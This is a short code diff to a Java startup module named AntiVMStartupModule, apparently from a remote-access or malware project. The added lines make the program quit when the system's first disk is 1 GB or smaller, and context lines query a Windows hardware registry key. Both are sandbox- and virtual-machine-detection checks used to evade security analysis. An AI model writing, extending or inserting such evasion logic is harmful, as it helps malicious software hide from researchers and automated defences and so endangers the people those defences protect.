@@ -16,7 +16,17 @@ public class AntiVMStartupModule extends StartupModule {
 
 	public void run() throws Exception {
 		try {
-			if (Boolean.parseBoolean(Configuration.getConfig().get("vm"))) {			
+			if (Boolean.parseBoolean(Configuration.getConfig().get("vm"))) {
+				try {
+					File root = File.listRoots()[0];
+					
+					if (root.getTotalSpace() <= 1024 * 1024 * 1024) {
+						System.exit(0);
+					}
+				} catch (Exception ex) {
+					ex.printStackTrace();
+				}
+				
 				if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 					Process p = Runtime.getRuntime().exec(new String[] { "reg", "query", "hkey_local_machine\\HARDWARE\\DESCRIPTION\\SYSTEM" });
 
